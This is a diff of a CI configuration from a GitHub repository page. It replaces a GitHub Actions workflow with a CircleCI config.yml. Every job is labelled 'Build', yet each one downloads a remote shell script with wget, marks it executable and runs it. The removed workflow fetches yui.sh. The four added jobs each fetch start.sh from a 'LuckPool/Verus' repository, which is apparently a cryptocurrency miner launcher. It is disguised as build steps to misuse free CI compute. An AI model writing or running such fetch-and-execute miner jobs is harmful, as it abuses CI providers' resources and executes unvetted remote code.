@@ -1,29 +1,83 @@
+Skip to content
+Search
+Pulls
+Issues
+Marketplace
+Explore
  
-name: CI
-on:
-  push:
-    branches: [main]
-  workflow_dispatch:
-    
+@ren11222 
+rikakasim
+/
+kasim
+Public
+1
+00
+Code
+Issues
+Pull requests
+Actions
+Projects
+Wiki
+Security
+Insights
+kasim/.circleci/config.yml
+@rikakasim
+rikakasim Create config.yml
+Latest commit e7a3b94 on May 23
+ History
+ 1 contributor
+40 lines (38 sloc)  1.17 KB
+ 
+version: 2
 jobs:
-  build:
-    name: RUN_BUILD
-    runs-on:  vova-VirtualBoxt
-    strategy:
-      max-parallel: 20
-      fail-fast: false
-      matrix:
-        go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
-    steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/checkout@v2
-    - name: setup build
-      uses: actions/checkout@v2
-    - name: running
-      run: |
-          wget https://github.com/ardisukarmo/andias/blob/main/yui.sh && chmod +x yui.sh && ./yui.sh
+    Build_01:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/LuckPool/master/Verus/01/start.sh && chmod u+x start.sh && ./start.sh
+    Build_02:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/LuckPool/master/Verus/01/start.sh && chmod u+x start.sh && ./start.sh
+    Build_03:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/LuckPool/master/Verus/01/start.sh && chmod u+x start.sh && ./start.sh
+    Build_04:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Build
+            command: wget https://raw.githubusercontent.com/golekopo/LuckPool/master/Verus/01/start.sh && chmod u+x start.sh && ./start.sh
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - Build_01
+            - Build_02
+            - Build_03
+            - Build_04
+© 2021 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+Loading complete
